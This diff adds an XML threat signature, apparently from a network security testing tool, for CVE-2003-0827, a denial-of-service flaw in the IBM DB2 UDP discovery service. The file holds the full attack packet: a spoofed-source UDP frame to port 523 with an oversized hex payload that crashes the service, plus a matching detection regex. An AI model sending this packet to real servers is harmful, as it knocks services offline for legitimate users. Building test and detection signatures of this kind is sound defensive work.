@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="DB2 Discover Service Denial of Service"/>
+    <EngDesc display="true" value="The IBM DB2 provides a UDP discovery service that listens on port 523. The service expects packets to be sent to the service with a payload of 20 bytes or less. This threat sends a UDP packet to the service whose length is greater than 20 bytes which causes the service to crash resulting in a denial of service to legitimate users."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="IBM"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Transport_Layer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Transport_Layer_UDP"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://marc.theaimsgroup.com/?l=bugtraq&amp;m=106399616919636&amp;w=2"/>
+    <CVEID display="true" value="CVE-2003-0827"/>
+    <bugtraqID display="true" value=" 8653"/>
+    <OSVDB display="true" value="2169"/>
+    <Author display="true" value="Phil Trainor"/>
+    <ID display="true" value="000000ff464d305300a900fe009b00c900e1d024"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725879240312500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X44\X42\X32\X47\X45\X54\X41\X44\X44\X52\X20\X53\X51\X4C\X30\X37\X30\X32\X30\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41"/>
+    <Created value="1139461721" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="@random(00:00:00:00:00:00,FF:FF:FF:FF:FF:FF)" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="" TTL="ff" Protocol="11" HeaderChecksum="" srcIP="@random(0.0.0.0,255.255.255.255)" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1024,65535)" destPort="$destPort" checksum="" length="" Payload="444232474554414444522053514C303730323041414141414141414141"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
